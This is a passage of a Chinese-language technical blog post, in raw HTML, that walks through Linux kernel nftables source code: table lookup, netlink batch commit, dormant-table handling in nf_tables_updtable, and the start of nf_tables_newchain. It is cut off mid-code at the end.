class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">EXPORT_SYMBOL <span class="keyword">void</span> *<span class="title">mnl_attr_get_payload</span><span class="params">(<span class="keyword">const</span> struct nlattr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">void</span> *)attr + MNL_ATTR_HDRLEN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是取出<code>nlattr</code>的头部之后payload，所以这里直观来看有两层payload部分。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct nft_table *<span class="title">nft_table_lookup</span><span class="params">(<span class="keyword">const</span> struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">const</span> struct nlattr *nla,</span></span></span><br><span class="line"><span class="params"><span class="function">  u8 family, u8 genmask)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">list_for_each_entry_rcu(table, &amp;net-&gt;nft.tables, <span class="built_in">list</span>,</span><br><span class="line">lockdep_is_held(&amp;net-&gt;nft.commit_mutex)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!nla_strcmp(nla, table-&gt;name) &amp;&amp;</span><br><span class="line">    table-&gt;family == family &amp;&amp;</span><br><span class="line">    nft_active_genmask(table, genmask))</span><br><span class="line"><span class="keyword">return</span> table;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ERR_PTR(-ENOENT);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么回到内核态，这里的nla就是类似如下结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">my_nlattr</span> &#123;</span></span><br><span class="line">  __u16           nla_len;</span><br><span class="line">__u16           nla_type;</span><br><span class="line">  <span class="keyword">auto</span> data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>随后这里会根据<code>family</code>、<code>name</code>以及<code>genmask</code>来判断是否能够在net中找到table，如果能够找到table，那证明已经存在这个table了，那么要做的就是更新表，这里浅浅说一下更新的流程以及目的是什么吧。</p><p>在<code>nfnetlink_rev_batch</code>函数中可以看到的是在最后的done分支中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (status &amp; NFNL_BATCH_REPLAY) &#123;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (status == NFNL_BATCH_DONE) &#123;</span><br><span class="line">err = ss-&gt;commit(net, oskb);</span><br><span class="line"><span class="keyword">if</span> (err == -EAGAIN) &#123;</span><br><span class="line">status |= NFNL_BATCH_REPLAY;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (err) &#123;</span><br><span class="line">ss-&gt;<span class="built_in">abort</span>(net, oskb, NFNL_ABORT_NONE);</span><br><span class="line">netlink_ack(oskb, nlmsg_hdr(oskb), err, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ss-&gt;cleanup)</span><br><span class="line">ss-&gt;cleanup(net);</span><br><span class="line"></span><br><span class="line">nfnl_err_deliver(&amp;err_list, oskb);</span><br><span class="line">kfree_skb(skb);</span><br><span class="line">module_put(ss-&gt;owner);</span><br></pre></td></tr></table></figure><p>会根据不同的status来进入到不同的分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nftnl_batch_end</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">uint32_t</span> seq)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">nftnl_batch_build_hdr(buf, NFNL_MSG_BATCH_END, seq);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nftnl_batch_end);</span><br></pre></td></tr></table></figure><p>对于我们来说正常结束的时候会对加上<code>NFNL_MSG_BATCH_END</code>标识。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">type = nlh-&gt;nlmsg_type;</span><br><span class="line"><span class="keyword">if</span> (type == NFNL_MSG_BATCH_BEGIN) &#123;</span><br><span class="line">  <span class="comment">/* Malformed: Batch begin twice */</span></span><br><span class="line">  nfnl_err_reset(&amp;err_list);</span><br><span class="line">  status |= NFNL_BATCH_FAILURE;</span><br><span class="line">  <span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == NFNL_MSG_BATCH_END) &#123;</span><br><span class="line">  status |= NFNL_BATCH_DONE;</span><br><span class="line">  <span class="keyword">goto</span> done;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (type &lt; NLMSG_MIN_TYPE) &#123;</span><br><span class="line">  err = -EINVAL;</span><br><span class="line">  <span class="keyword">goto</span> ack;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>nfnetlink_rev_batch</code>函数中会根据不同的type修改调status，所以正常结束时会进入到<code>status == NFNL_BATCH_DONE</code>分支中，并执行<code>ss-&gt;commit</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_commit</span><span class="params">(struct net *net, struct sk_buff *skb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>, *<span class="title">next</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans_elem</span> *<span class="title">te</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (list_empty(&amp;net-&gt;nft.commit_list)) &#123;</span><br><span class="line">mutex_unlock(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 0. Validate ruleset, otherwise roll back for error reporting. */</span></span><br><span class="line"><span class="keyword">if</span> (nf_tables_validate(net) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">err = nft_flow_rule_offload_commit(net);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 1.  Allocate space for next generation rules_gen_X[] */</span></span><br><span class="line">list_for_each_entry_safe (trans, next, &amp;net-&gt;nft.commit_list, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trans-&gt;msg_type == NFT_MSG_NEWRULE ||</span><br><span class="line">    trans-&gt;msg_type == NFT_MSG_DELRULE) &#123;</span><br><span class="line">chain = trans-&gt;ctx.chain;</span><br><span class="line"></span><br><span class="line">ret = nf_tables_commit_chain_prepare(net, chain);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">nf_tables_commit_chain_prepare_cancel(net);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* step 2.  Make rules_gen_X visible to packet path */</span></span><br><span class="line">list_for_each_entry (table, &amp;net-&gt;nft.tables, <span class="built_in">list</span>) &#123;</span><br><span class="line">list_for_each_entry (chain, &amp;table-&gt;chains, <span class="built_in">list</span>)</span><br><span class="line">nf_tables_commit_chain(net, chain);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Bump generation counter, invalidate any dump in progress.</span></span><br><span class="line"><span class="comment"> * Cannot fail after this point.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">while</span> (++net-&gt;nft.base_seq == <span class="number">0</span>)</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* step 3. Start new generation, rules_gen_X now in use. */</span></span><br><span class="line">net-&gt;nft.gencursor = nft_gencursor_next(net);</span><br><span class="line"></span><br><span class="line">list_for_each_entry_safe (trans, next, &amp;net-&gt;nft.commit_list, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> (trans-&gt;msg_type) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWTABLE:</span><br><span class="line"><span class="keyword">if</span> (nft_trans_table_update(trans)) &#123;</span><br><span class="line"><span class="keyword">if</span> (!nft_trans_table_enable(trans)) &#123;</span><br><span class="line">nf_tables_table_disable(</span><br><span class="line">net, trans-&gt;ctx.table);</span><br><span class="line">trans-&gt;ctx.table-&gt;flags |=</span><br><span class="line">NFT_TABLE_F_DORMANT;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">nft_clear(net, trans-&gt;ctx.table);</span><br><span class="line">&#125;</span><br><span class="line">nf_tables_table_notify(&amp;trans-&gt;ctx, NFT_MSG_NEWTABLE);</span><br><span class="line">nft_trans_destroy(trans);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_MSG_DELTABLE:</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_commit_notify(net, NETLINK_CB(skb).portid);</span><br><span class="line">nf_tables_gen_notify(net, skb, NFT_MSG_NEWGEN);</span><br><span class="line">nf_tables_commit_release(net);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先这里会对<code>net-&gt;nft.commit_list</code>存在几次遍历，主要看后面会对当前<code>trans</code>所属于的操作进行处理，当前的操作也就是<code>NFT_MSG_NEW_TABLE</code>操作，会判断当前<code>trans</code>是否更新，以及当前表是否<code>enable</code>，如果是未启用状态则会进入到<code>nf_tables_table_disable</code>函数中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_table_disable</span><span class="params">(struct net *net, struct nft_table *table, u32 cnt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line">u32 i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">list_for_each_entry (chain, &amp;table-&gt;chains, <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!nft_is_active_next(net, chain))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (!nft_is_base_chain(chain))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cnt &amp;&amp; i++ == cnt)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">nf_tables_unregister_hook(net, table, chain);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nf_tables_table_disable</span><span class="params">(struct net *net, struct nft_table *table)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">nft_table_disable(net, table, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会将所有未激活的并且为非常规的该表下所有链脱离hook（即无法在触发）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trans-&gt;ctx.table-&gt;flags |=</span><br><span class="line">NFT_TABLE_F_DORMANT;</span><br></pre></td></tr></table></figure><p>并且最后给该table标记为休眠状态。下面回到<code>nf_tables_newtable</code>函数中，这里更新处理的第一步就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_ctx_init</span><span class="params">(struct nft_ctx *ctx, struct net *net,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function"> u8 family, struct nft_table *table,</span></span></span><br><span class="line"><span class="params"><span class="function"> struct nft_chain *chain,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct nlattr *<span class="keyword">const</span> *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ctx-&gt;net = net;</span><br><span class="line">ctx-&gt;family = family;</span><br><span class="line">ctx-&gt;level = <span class="number">0</span>;</span><br><span class="line">ctx-&gt;table = table;</span><br><span class="line">ctx-&gt;chain = chain;</span><br><span class="line">ctx-&gt;nla = nla;</span><br><span class="line">ctx-&gt;portid = NETLINK_CB(skb).portid;</span><br><span class="line">ctx-&gt;report = nlmsg_report(nlh);</span><br><span class="line">ctx-&gt;flags = nlh-&gt;nlmsg_flags;</span><br><span class="line">ctx-&gt;seq = nlh-&gt;nlmsg_seq;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>nft_ctx_init</code>函数将所有内容赋值到<code>ctx</code>中去。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_updtable</span><span class="params">(struct nft_ctx *ctx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>;</span></span><br><span class="line">u32 flags;</span><br><span class="line"><span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;nla[NFTA_TABLE_FLAGS])</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">flags = ntohl(nla_get_be32(ctx-&gt;nla[NFTA_TABLE_FLAGS]));</span><br><span class="line"><span class="keyword">if</span> (flags &amp; ~NFT_TABLE_F_DORMANT)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags == ctx-&gt;table-&gt;flags)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">trans = nft_trans_alloc(ctx, NFT_MSG_NEWTABLE,</span><br><span class="line"><span class="keyword">sizeof</span>(struct nft_trans_table));</span><br><span class="line"><span class="keyword">if</span> (trans == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; NFT_TABLE_F_DORMANT) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;table-&gt;flags &amp; NFT_TABLE_F_DORMANT)) &#123;</span><br><span class="line">nft_trans_table_enable(trans) = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!(flags &amp; NFT_TABLE_F_DORMANT) &amp;&amp;</span><br><span class="line">   ctx-&gt;table-&gt;flags &amp; NFT_TABLE_F_DORMANT) &#123;</span><br><span class="line">ctx-&gt;table-&gt;flags &amp;= ~NFT_TABLE_F_DORMANT;</span><br><span class="line">ret = nf_tables_table_enable(ctx-&gt;net, ctx-&gt;table);</span><br><span class="line"><span class="keyword">if</span> (ret &gt;= <span class="number">0</span>)</span><br><span class="line">nft_trans_table_enable(trans) = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ctx-&gt;table-&gt;flags |= NFT_TABLE_F_DORMANT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">nft_trans_table_update(trans) = <span class="literal">true</span>;</span><br><span class="line">list_add_tail(&amp;trans-&gt;<span class="built_in">list</span>, &amp;ctx-&gt;net-&gt;nft.commit_list);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">err:</span><br><span class="line">nft_trans_destroy(trans);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后调用<code>nf_tables_updtable</code>函数，通过判断用户态传入的flags和内核table所有用的flags来判断是否让该table休眠或是启用。</p><p>接着回到<code>nf_tables_newtable</code>函数流程，如果没有找到对应的table，就是通过<code>kzalloc</code>申请table随后对其进行成员初始化，并且初始化它的链的哈希表<code>chains_ht</code>，最后添加到<code>net-&gt;nft.tables</code>中即可。</p><h3 id="配置链"><a href="#配置链" class="headerlink" title="配置链"></a>配置链</h3><p>有了前面配置表的基础，再来看配置链会相对简单许多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nf_tables_newchain</span><span class="params">(struct net *net, struct sock *nlsk,</span></span></span><br><span class="line"><span class="params"><span class="function">      struct sk_buff *skb, <span class="keyword">const</span> struct nlmsghdr *nlh,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">const</span> struct nlattr *<span class="keyword">const</span> nla[],</span></span></span><br><span class="line"><span class="params"><span class="function">      struct netlink_ext_ack *extack)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nfgenmsg</span> *<span class="title">nfmsg</span> =</span> nlmsg_data(nlh);</span><br><span class="line">u8 genmask = nft_genmask_next(net);</span><br><span class="line"><span class="keyword">int</span> family = nfmsg-&gt;nfgen_family;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">attr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_table</span> *<span class="title">table</span>;</span></span><br><span class="line">u8 policy = NF_ACCEPT;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">u64 handle = <span class="number">0</span>;</span><br><span class="line">u32 flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">lockdep_assert_held(&amp;net-&gt;nft.commit_mutex);</span><br><span class="line"></span><br><span class="line">table = nft_table_lookup(net, nla[NFTA_CHAIN_TABLE], family, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(table)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_TABLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">chain = <span class="literal">NULL</span>;</span><br><span class="line">attr = nla[NFTA_CHAIN_NAME];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_HANDLE]) &#123;</span><br><span class="line">handle = be64_to_cpu(nla_get_be64(nla[NFTA_CHAIN_HANDLE]));</span><br><span class="line">chain = nft_chain_lookup_byhandle(table, handle, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_HANDLE]);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line">attr = nla[NFTA_CHAIN_HANDLE];</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nla[NFTA_CHAIN_NAME]) &#123;</span><br><span class="line">chain = nft_chain_lookup(net, table, attr, genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain)) &#123;</span><br><span class="line"><span class="keyword">if</span> (PTR_ERR(chain) != -ENOENT) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, attr);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125;</span><br><span class="line">chain = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!nla[NFTA_CHAIN_ID]) &#123;</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nla[NFTA_CHAIN_POLICY]) &#123;</span><br><span class="line"><span class="keyword">if</span> (chain != <span class="literal">NULL</span> &amp;&amp; !nft_is_base_chain(chain)) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain == <span class="literal">NULL</span> &amp;&amp; nla[NFTA_CHAIN_HOOK] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">NL_SET_BAD_ATTR(extack, nla[NFTA_CHAIN_POLICY]);</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">policy = ntohl(nla_get_be32(nla[NFTA_CHAIN_POLICY]));</span><br><span class="line"><span class="keyword">switch</span> (policy) &#123;</span><br><span class="line"><span class="keyword">case</span> 